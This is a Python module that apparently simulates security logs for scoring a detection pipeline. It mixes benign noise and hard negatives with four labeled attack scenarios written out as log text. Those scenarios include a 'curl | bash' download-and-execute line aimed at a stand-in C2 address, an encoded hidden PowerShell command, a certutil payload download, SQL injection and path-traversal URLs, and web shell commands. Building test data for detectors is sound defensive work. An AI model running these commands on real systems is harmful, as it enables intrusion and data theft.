"""Deterministic log simulator with labeled attack scenarios.

Produces four log files (auth, sysmon, firewall, apache) containing realistic benign noise,
a few deliberately tricky benign cases ("hard negatives"), and four injected attack scenarios.
A ``ground_truth.json`` file records which rules each scenario should trigger so the pipeline
can be scored (see :mod:`intellidetect.evaluate`).

Attacker addresses use the RFC 5737 documentation ranges so nothing here points at real hosts.
"""

from __future__ import annotations

import json
import random
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

from .parsers import DEFAULT_FILENAMES, MONTHS

UTC = timezone.utc
MONTH_NAMES = {v: k for k, v in MONTHS.items()}

USERS = {  # user -> (workstation, ip)
    "alice": ("WS-ALICE", "10.0.10.21"),
    "bob": ("WS-BOB", "10.0.10.22"),
    "carol": ("WS-CAROL", "10.0.10.23"),
    "dave": ("WS-DAVE", "10.0.10.24"),
    "erin": ("WS-ERIN", "10.0.10.25"),
}
INTERNAL_SERVERS = {"DC01": "10.0.2.5", "FILESRV01": "10.0.2.10", "web01": "10.0.3.10",
                    "bastion01": "10.0.1.5", "backup01": "10.0.2.50"}
PUBLIC_SITES = ["142.250.190.46", "151.101.1.69", "140.82.112.3", "104.18.32.7", "13.107.246.45",
                "52.96.108.2", "17.253.144.10", "31.13.71.36", "172.217.14.206", "162.159.134.234"]
DOMAINS = ["google.com", "github.com", "microsoft.com", "office365.com", "slack.com", "zoom.us",
           "stackoverflow.com", "cloudflare.com", "wikipedia.org", "linkedin.com", "python.org"]
UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0", "Mozilla/5.0 (X11; Linux x86_64) Firefox/125.0",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) Safari/605.1.15"]
WEB_PATHS = ["/", "/index.html", "/products", "/about", "/contact", "/login", "/static/app.js",
             "/static/site.css", "/api/items", "/blog", "/favicon.ico"]

ATTACKER_BRUTE = "203.0.113.45"
ATTACKER_WEB = "203.0.113.77"
ATTACKER_SCAN = "198.51.100.99"
C2_IP = "192.0.2.77"
EXFIL_IP = "192.0.2.99"
C2_DOMAIN = "update-cdn-sync.top"


@dataclass
class Scenario:
    id: str
    name: str
    malicious: bool
    description: str
    expected_rules: list[str] = field(default_factory=list)
    entities: list[str] = field(default_factory=list)


class Simulator:
    def __init__(self, seed: int = 1337, start: datetime | None = None, hours: int = 8):
        self.rng = random.Random(seed)
        if start is None:
            day = datetime.now(UTC).replace(hour=8, minute=0, second=0, microsecond=0)
            start = day - timedelta(days=1)
        self.start = start.astimezone(UTC)
        self.hours = hours
        self.lines: dict[str, list[tuple[datetime, str]]] = {k: [] for k in DEFAULT_FILENAMES}
        self.scenarios: list[Scenario] = []

    # ------------------------------------------------------------------ emitters
    def _at(self, minutes: float, seconds: float = 0) -> datetime:
        return self.start + timedelta(minutes=minutes, seconds=seconds)

    def auth(self, ts: datetime, host: str, msg: str, proc: str = "sshd") -> None:
        pid = self.rng.randint(1000, 60000)
        tag = f"{proc}[{pid}]" if proc == "sshd" else proc
        line = f"{MONTH_NAMES[ts.month]} {ts.day:>2} {ts:%H:%M:%S} {host} {tag}: {msg}"
        self.lines["auth"].append((ts, line))

    def ssh_fail(self, ts: datetime, host: str, user: str, ip: str, invalid: bool = False) -> None:
        who = f"invalid user {user}" if invalid else user
        self.auth(ts, host, f"Failed password for {who} from {ip} port {self.rng.randint(1024, 65000)} ssh2")

    def ssh_ok(self, ts: datetime, host: str, user: str, ip: str, method: str = "publickey") -> None:
        self.auth(ts, host, f"Accepted {method} for {user} from {ip} port {self.rng.randint(1024, 65000)} ssh2")

    def sudo(self, ts: datetime, host: str, user: str, command: str) -> None:
        self.auth(ts, host, f"    {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={command}",
                  proc="sudo")

    def sysmon(self, ts: datetime, event_id: int, kind: str, host: str, user: str, **fields: str) -> None:
        stamp = f"{ts:%Y-%m-%d %H:%M:%S}.{ts.microsecond // 1000:03d} UTC"
        kv = ";".join(f"{k}={v}" for k, v in fields.items())
        line = f"{stamp};EventID {event_id};{kind};Computer={host};User=CORP\\{user};{kv}"
        self.lines["sysmon"].append((ts, line))

    def proc(self, ts: datetime, host: str, user: str, image: str, parent: str, cmd: str) -> None:
        self.sysmon(ts, 1, "ProcessCreate", host, user, Image=image, ParentImage=parent,
                    CommandLine=cmd, ProcessId=str(self.rng.randint(1000, 60000)))

    def netconn(self, ts: datetime, host: str, user: str, image: str, src: str, dst: str, port: int) -> None:
        self.sysmon(ts, 3, "NetworkConnect", host, user, Image=image, SourceIp=src,
                    DestinationIp=dst, DestinationPort=str(port), Protocol="tcp")

    def dns(self, ts: datetime, host: str, user: str, name: str) -> None:
        self.sysmon(ts, 22, "DNSQuery", host, user, QueryName=name, Image="C:\\Windows\\System32\\svchost.exe")

    def fw(self, ts: datetime, action: str, src: str, dst: str, dport: int, nbytes: int = 0) -> None:
        line = (f"{ts:%Y-%m-%d %H:%M:%S} {action} TCP {src}:{self.rng.randint(1024, 65000)} -> "
                f"{dst}:{dport} BYTES={nbytes}")
        self.lines["firewall"].append((ts, line))

    def web(self, ts: datetime, ip: str, url: str, status: int = 200, method: str = "GET",
            user: str = "-", nbytes: int | None = None) -> None:
        nbytes = self.rng.randint(300, 40000) if nbytes is None else nbytes
        stamp = f"{ts:%d}/{MONTH_NAMES[ts.month]}/{ts:%Y:%H:%M:%S} +0000"
        line = (f'{ip} - {user} [{stamp}] "{method} {url} HTTP/1.1" {status} {nbytes} "-" '
                f'"{self.rng.choice(UAS)}"')
        self.lines["apache"].append((ts, line))

    # ------------------------------------------------------------------ baseline
    def _public_ip(self) -> str:
        a = self.rng.choice([31, 45, 62, 77, 91, 104, 151, 185])
        return f"{a}.{self.rng.randint(1, 254)}.{self.rng.randint(1, 254)}.{self.rng.randint(1, 254)}"

    def baseline(self) -> None:
        rng = self.rng
        span = self.hours * 60
        for user, (host, ip) in USERS.items():
            # Workday process activity
            for _ in range(rng.randint(120, 170)):
                t = self._at(rng.uniform(0, span), rng.uniform(0, 59))
                image = rng.choice(["chrome.exe", "outlook.exe", "excel.exe", "winword.exe", "teams.exe",
                                    "code.exe", "notepad.exe"])
                self.proc(t, host, user, f"C:\\Program Files\\App\\{image}", "C:\\Windows\\explorer.exe",
                          image)
            for _ in range(rng.randint(150, 220)):
                t = self._at(rng.uniform(0, span), rng.uniform(0, 59))
                site = rng.choice(PUBLIC_SITES)
                self.netconn(t, host, user, "C:\\Program Files\\Google\\Chrome\\chrome.exe", ip, site, 443)
                self.fw(t, "ACCEPT", ip, site, 443, rng.randint(500, 250_000))
            for _ in range(rng.randint(60, 100)):
                t = self._at(rng.uniform(0, span), rng.uniform(0, 59))
                self.dns(t, host, user, rng.choice(DOMAINS))
            for _ in range(rng.randint(10, 20)):
                t = self._at(rng.uniform(0, span), rng.uniform(0, 59))
                self.fw(t, "ACCEPT", ip, INTERNAL_SERVERS["FILESRV01"], 445, rng.randint(2_000, 900_000))
                self.fw(t, "ACCEPT", ip, INTERNAL_SERVERS["DC01"], 445, rng.randint(1_000, 20_000))
            # Admins and power users run PowerShell interactively (no encoded / bypass flags)
            for _ in range(rng.randint(2, 5)):
                t = self._at(rng.uniform(0, span), rng.uniform(0, 59))
                self.proc(t, host, user, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                          "C:\\Windows\\explorer.exe", "powershell.exe -NoProfile -Command Get-Service")
            # SSH logins to the jump host, occasionally mistyping a password once or twice
            for _ in range(rng.randint(15, 30)):
                t = self._at(rng.uniform(0, span), rng.uniform(0, 59))
                if rng.random() < 0.15:
                    for k in range(rng.randint(1, 2)):
                        self.ssh_fail(t + timedelta(seconds=3 * k), "bastion01", user, ip)
                    t += timedelta(seconds=12)
                self.ssh_ok(t, "bastion01", user, ip)
        # Operations activity on Linux hosts
        for _ in range(45):
            t = self._at(rng.uniform(0, span), rng.uniform(0, 59))
            cmd = rng.choice(["/bin/systemctl restart nginx", "/usr/bin/apt update", "/usr/bin/docker ps",
                              "/usr/bin/journalctl -u nginx", "/usr/bin/curl -fsSL https://example.org -o /tmp/x"])
            self.sudo(t, rng.choice(["web01", "bastion01"]), "ops", cmd)
        # Public website traffic
        clients = [self._public_ip() for _ in range(70)]
        for _ in range(1300):
            t = self._at(rng.uniform(0, span), rng.uniform(0, 59))
            status = rng.choices([200, 304, 404, 500], weights=[88, 6, 5, 1])[0]
            self.web(t, rng.choice(clients), rng.choice(WEB_PATHS), status)
        # Internet background noise hitting the firewall
        for _ in range(180):
            t = self._at(rng.uniform(0, span), rng.uniform(0, 59))
            self.fw(t, "DROP", self._public_ip(), INTERNAL_SERVERS["web01"],
                    rng.choice([22, 23, 80, 443, 3389, 8080]))

    # ------------------------------------------------------------ hard negatives
    def hard_negatives(self) -> None:
        rng = self.rng
        # N1: authorized vulnerability scan (port scan + SMB sweep) from the scanner
        t0 = 95
        for i, port in enumerate(range(1, 201)):
            self.fw(self._at(t0, i * 0.2), "DROP", "10.0.5.5", INTERNAL_SERVERS["web01"], port)
        for i in range(30):
            self.fw(self._at(t0 + 1, i), "ALLOW", "10.0.5.5", f"10.0.{rng.randint(10, 30)}.{i + 1}", 445, 900)
        self.scenarios.append(Scenario("N1", "Authorized vulnerability scan", False,
                                       "Trusted scanner probing ports and sweeping SMB. Must stay silent.",
                                       entities=["ip:10.0.5.5"]))
        # N2: approved off-site backup (large transfer)
        for i in range(5):
            self.fw(self._at(120 + i * 2), "ACCEPT", "10.0.2.50", "34.120.55.8", 443, 80_000_000)
        self.scenarios.append(Scenario("N2", "Scheduled off-site backup", False,
                                       "400 MB to the approved backup target. Must stay silent.",
                                       entities=["host:backup01"]))
        # N3: legitimate periodic telemetry from Teams (looks like beaconing)
        for i in range(120):
            self.netconn(self._at(0, 30 * i + rng.uniform(-3, 3)), "WS-BOB", "bob",
                         "C:\\Program Files\\Microsoft\\Teams\\teams.exe", "10.0.10.22", "13.107.42.14", 443)
        self.scenarios.append(Scenario("N3", "Teams telemetry heartbeat", False,
                                       "30-second regular check-ins to a Microsoft address. Must stay silent.",
                                       entities=["host:ws-bob"]))
        # N4: a user fat-fingers their password four times, then logs in
        t0 = self._at(210)
        for k in range(4):
            self.ssh_fail(t0 + timedelta(seconds=8 * k), "bastion01", "carol", "10.0.10.23")
        self.ssh_ok(t0 + timedelta(seconds=40), "bastion01", "carol", "10.0.10.23", "password")
        self.scenarios.append(Scenario("N4", "Mistyped password, then success", False,
                                       "Four failures then success is below the brute-force threshold.",
                                       entities=["user:carol"]))
        # N5: help-desk troubleshooting runs whoami /priv (true detection, benign cause)
        self.proc(self._at(250), "WS-DAVE", "helpdesk1", "C:\\Windows\\System32\\whoami.exe",
                  "C:\\Windows\\System32\\cmd.exe", "whoami /priv")
        self.scenarios.append(Scenario("N5", "Help-desk privilege check", False,
                                       "Fires IDT-SG-006 (benign true positive). An analyst closes it as P4.",
                                       expected_rules=["IDT-SG-006"], entities=["host:ws-dave"]))

    # ------------------------------------------------------------------ attacks
    def attack_ssh_compromise(self) -> None:
        rng = self.rng
        base = 70
        names = ["root", "admin", "test", "ubuntu", "oracle", "postgres", "ftpuser", "git", "deploy"]
        for i in range(64):
            user = rng.choice(names)
            self.ssh_fail(self._at(base, i * 4 + rng.uniform(0, 2)), "bastion01", user, ATTACKER_BRUTE,
                          invalid=user not in ("root", "deploy"))
        self.ssh_ok(self._at(base + 4.5), "bastion01", "deploy", ATTACKER_BRUTE, "password")
        self.sudo(self._at(base + 6), "bastion01", "deploy",
                  f"/bin/bash -c 'curl -s http://{C2_IP}/x.sh | bash'")
        self.scenarios.append(Scenario(
            "S1", "SSH brute force leading to account takeover", True,
            "Dictionary attack on the jump host, successful login as 'deploy', then a "
            "download-and-execute one-liner under sudo.",
            ["IDT-001", "IDT-002", "IDT-003", "IDT-SG-011"],
            [f"ip:{ATTACKER_BRUTE}", "host:bastion01"]))

    def attack_phishing_chain(self) -> None:
        rng = self.rng
        host, ip, user = "WS-ALICE", "10.0.10.21", "alice"
        t0 = 190
        office = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
        ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        self.proc(self._at(t0), host, user, "C:\\Windows\\System32\\cmd.exe", office, "cmd.exe /c powershell")
        self.proc(self._at(t0, 5), host, user, ps, "C:\\Windows\\System32\\cmd.exe",
                  "powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==")
        self.dns(self._at(t0, 30), host, user, C2_DOMAIN)
        self.proc(self._at(t0, 40), host, user, "C:\\Windows\\System32\\certutil.exe", ps,
                  f"certutil.exe -urlcache -split -f http://{C2_IP}/p.bin C:\\Users\\alice\\AppData\\Local\\Temp\\p.exe")
        self.proc(self._at(t0 + 2), host, user, "C:\\Windows\\System32\\schtasks.exe", ps,
                  'schtasks.exe /create /sc minute /mo 15 /tn "OneDrive Sync" /tr C:\\Users\\alice\\AppData\\Local\\Temp\\p.exe')
        for k, cmd in enumerate(["whoami /priv", "net user /domain", "nltest /dclist:corp.local"]):
            self.proc(self._at(t0 + 3, k * 8), host, user, "C:\\Windows\\System32\\cmd.exe",
                      "C:\\Users\\alice\\AppData\\Local\\Temp\\p.exe", cmd)
        # C2 beacon: ~60s interval, a few percent jitter
        for k in range(22):
            self.netconn(self._at(t0 + 3.5, 60 * k + rng.uniform(-2, 2)), host, user,
                         "C:\\Users\\alice\\AppData\\Local\\Temp\\p.exe", ip, C2_IP, 443)
        # SMB sweep, concentrating on the file server once found
        targets = [f"10.0.2.{n}" for n in (5, 6, 7, 8, 9, 11, 12, 50)] + [f"10.0.20.{n}" for n in range(1, 8)]
        for k, dst in enumerate(targets):
            self.fw(self._at(t0 + 8, k * 2.5), "ALLOW" if dst in ("10.0.2.5", "10.0.2.50") else "DROP",
                    ip, dst, 445, 600)
        for k in range(8):
            self.fw(self._at(t0 + 8, 40 + k), "ALLOW", ip, INTERNAL_SERVERS["FILESRV01"], 445, 4_000)
        # Credential dumping
        self.sysmon(self._at(t0 + 12), 10, "ProcessAccess", host, user,
                    SourceImage="C:\\Users\\alice\\AppData\\Local\\Temp\\p.exe",
                    TargetImage="C:\\Windows\\System32\\lsass.exe", GrantedAccess="0x1410")
        # Lateral movement with PsExec to the file server
        self.proc(self._at(t0 + 16), "FILESRV01", "SYSTEM", "C:\\Windows\\PSEXESVC.exe",
                  "C:\\Windows\\System32\\services.exe", "C:\\Windows\\PSEXESVC.exe")
        # Exfiltration: ~400 MB to the drop server
        for k in range(8):
            self.fw(self._at(t0 + 20, k * 35), "ACCEPT", ip, EXFIL_IP, 443, 50_000_000 + rng.randint(0, 5_000_000))
        self.scenarios.append(Scenario(
            "S2", "Phishing document to exfiltration (multi-stage intrusion)", True,
            "Word macro launches encoded PowerShell, downloads a payload, persists, beacons to C2, "
            "dumps credentials, sweeps SMB, moves to the file server with PsExec and exfiltrates data.",
            ["IDT-SG-001", "IDT-SG-002", "IDT-SG-003", "IDT-SG-004", "IDT-SG-005", "IDT-SG-006",
             "IDT-SG-007", "IDT-SG-012", "IDT-005", "IDT-006", "IDT-007"],
            ["host:ws-alice", "host:filesrv01", f"ip:{C2_IP}", f"ip:{EXFIL_IP}"]))

    def attack_scan_and_probe(self) -> None:
        rng = self.rng
        base = 270
        ports = rng.sample(range(1, 10000), 45)
        for k, port in enumerate(ports):
            self.fw(self._at(base, k * 0.7), "DROP", ATTACKER_SCAN, INTERNAL_SERVERS["web01"], port)
        for k in range(70):
            self.web(self._at(base + 1, k * 0.6), ATTACKER_SCAN, f"/{rng.choice(['admin', 'backup', 'old', 'test', 'config', 'db'])}{k}.php", 404)
        self.scenarios.append(Scenario(
            "S3", "Port scan followed by directory brute forcing", True,
            "External scanner enumerates ports on the web server then brute-forces paths.",
            ["IDT-004", "IDT-008"], [f"ip:{ATTACKER_SCAN}", "host:web01"]))

    def attack_web_exploit(self) -> None:
        base = 340
        a = ATTACKER_WEB
        probes = ["/products?id=1' or 1=1--", "/products?id=1 UNION SELECT username,password FROM users--",
                  "/search?q=1;select sleep(5)", "/download?file=../../../../etc/passwd",
                  "/download?file=..%2f..%2f..%2fetc%2fshadow"]
        for k, url in enumerate(probes):
            self.web(self._at(base, k * 6), a, url.replace(" ", "%20"), 200 if k == 1 else 403)
        self.web(self._at(base + 1), a, "/upload", 200, method="POST", nbytes=4_100)
        self.web(self._at(base + 1, 20), a, "/uploads/shell.php", 200, method="POST", nbytes=2_048)
        for k in range(5):
            self.web(self._at(base + 2, k * 9), a, f"/uploads/shell.php?cmd={['id', 'whoami', 'ls', 'uname', 'ps'][k]}",
                     200, nbytes=180)
        self.scenarios.append(Scenario(
            "S4", "Web application exploitation and web shell", True,
            "SQL injection and path traversal probes, then a PHP web shell is uploaded and used.",
            ["IDT-SG-008", "IDT-SG-009", "IDT-SG-010"], [f"ip:{a}", "host:web01"]))

    # ------------------------------------------------------------------- output
    def generate(self) -> Simulator:
        self.baseline()
        self.hard_negatives()
        self.attack_ssh_compromise()
        self.attack_phishing_chain()
        self.attack_scan_and_probe()
        self.attack_web_exploit()
        for rows in self.lines.values():
            rows.sort(key=lambda r: r[0])
        return self

    def write(self, out_dir: str | Path) -> dict[str, Any]:
        out = Path(out_dir)
        out.mkdir(parents=True, exist_ok=True)
        counts = {}
        for kind, rows in self.lines.items():
            (out / DEFAULT_FILENAMES[kind]).write_text(
                "\n".join(line for _, line in rows) + "\n", encoding="utf-8")
            counts[kind] = len(rows)
        truth = {
            "start": self.start.isoformat(),
            "year": self.start.year,
            "events": counts,
            "scenarios": [s.__dict__ for s in self.scenarios],
        }
        (out / "ground_truth.json").write_text(json.dumps(truth, indent=2), encoding="utf-8")
        return truth
